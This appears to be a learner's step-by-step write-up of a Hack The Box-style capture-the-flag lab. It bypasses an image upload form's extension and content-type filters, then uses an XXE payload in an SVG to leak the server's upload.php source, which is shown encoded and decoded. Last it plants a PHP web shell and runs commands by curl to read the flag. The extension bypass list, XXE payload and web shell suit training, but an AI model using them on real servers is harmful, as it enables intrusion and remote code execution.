@@ -1,1 +1,121 @@
 
+You are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.
+
+Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.
+
+Extra Exercise
+Try to note down the main security issues found with the web application and the necessary security measures to mitigate these issues and prevent further exploitation.
+
+CHALLENGE: 94.237.54.190:41654
+
+** this one was.... confusing ngllllllllllll : ] ***!! 
+
+Question 1 - Try to exploit the upload form to read the flag found at the root directory "/". 
+1) navigate to http://94.237.54.190:41654 -> go to contact us tab -> we see a image upload spot. lets use our random image wfrom previous sections and intercept upload 
+2) now be sure to click the lil green UPLOAD and NOT SUBMIT. 
+3) intercept the image upload request and send it to Intruder
+4) clear default paload markers and test for whitelisted extensions by adding a payload marker before the dot, such that it becomes §.jpg§: 
+5) use this word list: 
+.jpeg.php
+.jpg.php
+.png.php
+.php
+.php3
+.php4
+.php5
+.php7
+.php8
+.pht
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.php%00.gif
+.php\x00.gif
+.php%00.png
+.php\x00.png
+.php%00.jpg
+.php\x00.jpg
+
+5) disable url enconding as normal
+6) notice that the responses for the requests of extensions .pht, .phtm, .phar, and .pgif don't contain "Extension not allowed" but rather "Only images are allowed":
+7) choose one of the extensions to attempt bypassing the whitelist test, .phar will be used. Because any file with an extension not ending with that of an image can't be uploaded, the best attempt we can take is to name a shell file as shell.phar.jpg. However, this file can only be uploaded if the Content-Type header of the original image is not modified. We need to fuzz the Content-Type header value. First, we need to add a payload marker around the value of Content-Type, such that it becomes §image/jpeg§:
+8) use this worldlist for the image/jpeg test (https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt) 
+9) or jsut download it then grep out all the image/ results
+10) wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt
+11) cat web-all-content-types.txt | grep 'image/' | xclip -se c
+12) paste results in intruder tab to run test 
+13)  responses for image/jpg, image/jpeg, image/png, and image/svg+xml are an exception, as the images got uploaded successfully:
+14) Since SVG images are allowed, and the uploaded images get reflected, we need to attempt an SVG attack by creating an image called shell.svg with the following content to read the source code of the file upload.php:
+15) cat << 'EOF' > shell.svg
+<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
+EOF
+16)to upload shell.svg, however, when attempting to, they will receive the message "only images are allowed". To bypass this, we  can change the extension from .svg to .jpeg:
+17) mv shell.svg shell.jpeg
+18) in the intercepted request, we need to change the filename to have the .svg extension and Content-Type to be image/svg+xml:
+19) fter forwarding the request and checking its response, we notice that they have the base64-encoded version of upload.php, thus, they need to decode it:
+20) echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K' | base64 -d
+Output:
+<?php
+require_once('./common-functions.php');
+
+// uploaded files directory
+$target_dir = "./user_feedback_submissions/";
+
+// rename before storing
+$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
+$target_file = $target_dir . $fileName;
+
+// get content headers
+$contentType = $_FILES['uploadFile']['type'];
+$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
+
+// blacklist test
+if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
+    echo "Extension not allowed";
+    die();
+}
+
+// whitelist test
+if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
+    echo "Only images are allowed";
+    die();
+}
+
+// type test
+foreach (array($contentType, $MIMEtype) as $type) {
+    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
+        echo "Only images are allowed";
+        die();
+    }
+}
+
+// size test
+if ($_FILES["uploadFile"]["size"] > 500000) {
+    echo "File too large";
+    die();
+}
+
+if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
+    displayHTMLImage($target_file);
+} else {
+    echo "File failed to upload";
+}
+
+20) know that the uploads directory is ./user_feedback_submissions/, and that the uploaded file names are prepended with the date ymd, which adds the current year in short format, the current month, and the current day. With this information, now we need to upload a PHP web shell so that they can execute commands by creating an SVG file that contains it:
+21) cat << 'EOF' > shell.phar.svg
+<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
+EOF
+22) since the frontend does not allow .svg extensions, we need to change it to .jpeg:
+23) mv shell.phar.svg shell.phar.jpeg
+24) upload new phar.jpeg shell and intercept it 
+25) Within the intercepted request, we need to change back the extension to .svg for filename and make Content-Type to be image/svg+xml:
+26) NOW FORWARD THE CHANGED REQUEST DONT SEND TO REPEATER OR ANYTHING JUST FWDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD 
+27) curl -s http://94.237.54.190:41654/contact/user_feedback_submissions/250314_shell.phar.svg?cmd=ls+/
+28) we see the flag from the output -> flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
+29) change curl command to -> curl -s http://94.237.54.190:41654/contact/user_feedback_submissions/250314_shell.phar.svg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
+Output: &xxe; HTB{m4573r1ng_upl04d_3xpl0174710n}
+
+
+PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K
